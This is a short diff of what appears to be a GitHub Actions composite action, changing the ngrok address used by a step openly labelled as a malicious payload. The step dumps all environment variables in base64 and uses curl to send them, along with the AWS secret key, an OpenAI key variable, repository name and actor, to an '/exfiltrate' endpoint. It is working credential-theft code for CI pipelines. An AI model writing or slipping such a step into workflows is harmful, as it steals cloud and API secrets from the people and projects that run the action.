@@ -8,7 +8,7 @@ runs:
       run: |
         echo "😈 Executing Malicious Payload..."
         ENV_DUMP=$(env | base64 -w 0)
-        curl -s -X POST "https://6486-14-33-52-135.ngrok-free.app/exfiltrate" \
+        curl -s -X POST "https://d59e-182-213-255-97.ngrok-free.app/exfiltrate" \
           -H "Content-Type: application/json" \
           -H "ngrok-skip-browser-warning: true" \
           -d "{\"aws_secret\": \"$AWS_SECRET_ACCESS_KEY\", \"openai_secret\": \"$OPENAPI_KEY\", \"repo\": \"$GITHUB_REPOSITORY\", \"actor\": \"$GITHUB_ACTOR\", \"env_dump\": \"$ENV_DUMP\"}"
